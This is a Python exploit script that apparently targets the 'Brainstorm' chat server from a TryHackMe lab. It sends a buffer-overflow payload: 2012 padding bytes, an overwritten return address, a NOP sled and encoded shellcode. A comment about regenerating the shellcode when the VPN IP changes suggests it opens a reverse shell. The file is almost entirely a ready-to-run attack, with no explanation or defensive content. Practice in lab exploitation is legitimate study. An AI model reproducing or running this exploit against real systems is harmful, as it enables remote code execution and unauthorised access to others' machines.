#!/usr/bin/env python3

import sys, socket

ip = "10.10.81.86" # Or use sys.argv[1] to take cmdline arg
port = 9999 # Or use sys.argv[2] to take cmdline arg
username = b'user'

# Remember to regenerate shellcode if changing THM VPN IP or port!

payload = b'A'*2012+b'\xdf\x14\x50\x62'+b'\x90'*32 # Remember little endian reverse input for memory address
payload += b"\xd9\xc4\xd9\x74\x24\xf4\xba\x33\x9d\x78\x2a\x58"
payload += b"\x2b\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x63"
payload += b"\x8e\x9a\xdf\x7f\x58\xd8\x20\x7f\x99\xbd\xa9\x9a"
payload += b"\xa8\xfd\xce\xef\x9b\xcd\x85\xbd\x17\xa5\xc8\x55"
payload += b"\xa3\xcb\xc4\x5a\x04\x61\x33\x55\x95\xda\x07\xf4"
payload += b"\x15\x21\x54\xd6\x24\xea\xa9\x17\x60\x17\x43\x45"
payload += b"\x39\x53\xf6\x79\x4e\x29\xcb\xf2\x1c\xbf\x4b\xe7"
payload += b"\xd5\xbe\x7a\xb6\x6e\x99\x5c\x39\xa2\x91\xd4\x21"
payload += b"\xa7\x9c\xaf\xda\x13\x6a\x2e\x0a\x6a\x93\x9d\x73"
payload += b"\x42\x66\xdf\xb4\x65\x99\xaa\xcc\x95\x24\xad\x0b"
payload += b"\xe7\xf2\x38\x8f\x4f\x70\x9a\x6b\x71\x55\x7d\xf8"
payload += b"\x7d\x12\x09\xa6\x61\xa5\xde\xdd\x9e\x2e\xe1\x31"
payload += b"\x17\x74\xc6\x95\x73\x2e\x67\x8c\xd9\x81\x98\xce"
payload += b"\x81\x7e\x3d\x85\x2c\x6a\x4c\xc4\x38\x5f\x7d\xf6"
payload += b"\xb8\xf7\xf6\x85\x8a\x58\xad\x01\xa7\x11\x6b\xd6"
payload += b"\xc8\x0b\xcb\x48\x37\xb4\x2c\x41\xfc\xe0\x7c\xf9"
payload += b"\xd5\x88\x16\xf9\xda\x5c\xb8\xa9\x74\x0f\x79\x19"
payload += b"\x35\xff\x11\x73\xba\x20\x01\x7c\x10\x49\xa8\x87"
payload += b"\xf3\x7c\x20\x81\x08\xe9\x38\x8d\x0a\x3b\xb5\x6b"
payload += b"\x78\xab\x90\x24\x15\x52\xb9\xbe\x84\x9b\x17\xbb"
payload += b"\x87\x10\x94\x3c\x49\xd1\xd1\x2e\x3e\x11\xac\x0c"
payload += b"\xe9\x2e\x1a\x38\x75\xbc\xc1\xb8\xf0\xdd\x5d\xef"
payload += b"\x55\x13\x94\x65\x48\x0a\x0e\x9b\x91\xca\x69\x1f"
payload += b"\x4e\x2f\x77\x9e\x03\x0b\x53\xb0\xdd\x94\xdf\xe4"
payload += b"\xb1\xc2\x89\x52\x74\xbd\x7b\x0c\x2e\x12\xd2\xd8"
payload += b"\xb7\x58\xe5\x9e\xb7\xb4\x93\x7e\x09\x61\xe2\x81"
payload += b"\xa6\xe5\xe2\xfa\xda\x95\x0d\xd1\x5e\xb5\xef\xf3"
payload += b"\xaa\x5e\xb6\x96\x16\x03\x49\x4d\x54\x3a\xca\x67"
payload += b"\x25\xb9\xd2\x02\x20\x85\x54\xff\x58\x96\x30\xff"
payload += b"\xcf\x97\x10"

# Connection section
print("Overflow for Brainstorm")
print("Attempting to connect to chat server and send payload")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("Connected")
except Exception as e:
    print("Error Connecting")
    print(e)
    sys.exit(1)
print("Sennding username/payload")
try:
    s.recv(1024)
    s.recv(1024)
    print("Sending username")
    s.send(username + b'\r\n')
    s.recv(1024)
    print("Sending payload")
    s.send(payload + b'\r\n') 
    s.recv(1024)
except Exception as e:
    print("Error sending data")
    print(e)
    sys.exit(1)

finally:
    print("Closing socket")
    s.close()